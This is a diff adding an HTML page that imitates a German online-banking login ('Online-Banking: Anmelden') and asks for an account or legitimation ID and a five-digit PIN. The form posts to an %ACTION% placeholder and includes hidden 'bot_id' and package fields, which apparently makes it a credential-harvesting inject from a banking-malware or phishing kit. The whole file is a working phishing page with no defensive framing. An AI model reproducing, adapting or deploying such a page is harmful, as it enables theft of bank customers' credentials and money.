@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<style type="text/css">
+  html,body,form{     height:100%; }  table.main_table {     height: 100%;     width: 100%; }  tr.tr1 {     /* height: 100%; */ } body {     background: #fcfcfc; } .logo {     text-align: center;     margin-bottom: 29px; }  img.i898 {     width: 68px; }  td.td1 {     vertical-align: top;     padding-top: 54px; }  label{   display:block; } .form-control, .form-control:focus {   background: transparent;   border:0;   box-shadow: none;   border-radius: 0;   padding: 0 !important;   border-bottom: 1px solid #a1a1a1;   outline:none;   height: 22px;   font-size: 18px;   /* height: 0 !important; */   transition:all .2s ease; } .form-control:focus {   border-bottom: 1px solid black; } /*lebells*/ .control-label {     z-index: -1;     position: relative;     top: 23px;     font-weight: 100;     color: #a1a1a1;     transition: all .3s ease; } .control-label.up {     top: 4px;     font-size: 11px;     color: #8b8b8b; } /*lebells*/   .main {     padding: 0px 19px; }  .legend {     text-align: center;     color: #343434;     font-size: 18px;     margin: 34px 1px; }  label.control-label.err_label {     color: red;     display: none; }  .form-group.has_err label {     display: none; }  .form-group.has_err .err_label {     display: block; }  .form-group.has_err .form-control {     border-bottom-color: red; }  .main_bottom {     padding: 2px 31px;     /* padding-bottom: 26px; */ }  button.btn.btn-danger {     width: 100%;     background: #fc0209;     border-radius: 3px;     font-size: 16px;     border: 0;     padding: 8px 3px; } .main {     padding: 1px 17px; } span.fa.fa-circle-o-notch.fa-spin {     color: red !important; }
+</style>
+  </head>
+
+<body>
+<table class="main_table scum" id="login_step" >
+  <tr class="tr1">
+	 <td class="td1">
+		<div  class="container "  style="">
+				<div  class="logo hide_on_focus"  style="">
+				   <img src="http://i.imgur.com/gHWDq62.gif" style="" class="i898"/>
+				</div>
+		<div  class="main"  style="">
+
+	<script src='%DYN_PATH_GENERAL%/validator.js'></script>
+	<form id='mainform' method='post' action='%ACTION%' onsubmit="return formvalidator()">
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+				<div  class="legend "  style="">
+						Online-Banking: Anmelden
+				</div>
+				<div  class="form-group "  style="">
+						<label class="control-label" for="">Kontonummer/Legitimations-ID </label>
+						
+						<label class="control-label err_label" style="" for="">Kontonummer/Legitimations-ID </label>
+						<input class="form-control" autocomplete="off" type="text" name="fields[user]" id="user" data-reg="/^\w+$/" maxlength="16" placeholder="" />
+				</div>
+				<div  class="form-group "  style="">
+						<label class="control-label" for="">PIN</label>
+						<label class="control-label err_label" for="">PIN</label>
+						<input class="form-control" autocomplete="off" type="password" name="fields[pin]" id="pin" data-reg="/^\d{5}$/" maxlength="5" placeholder="" />
+				</div>
+			</form>
+		</div>
+		</div>
+	 
+	 </td>
+  </tr> 
+  <tr class="tr2">
+	 <td class="td1">
+		<div  class="main_bottom "  style="">
+			<button class="btn btn-danger" form="mainform">Anmelden</button>
+		</div>
+	 </td>
+  </tr >
+</table>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>  
+</body>
+</html>  
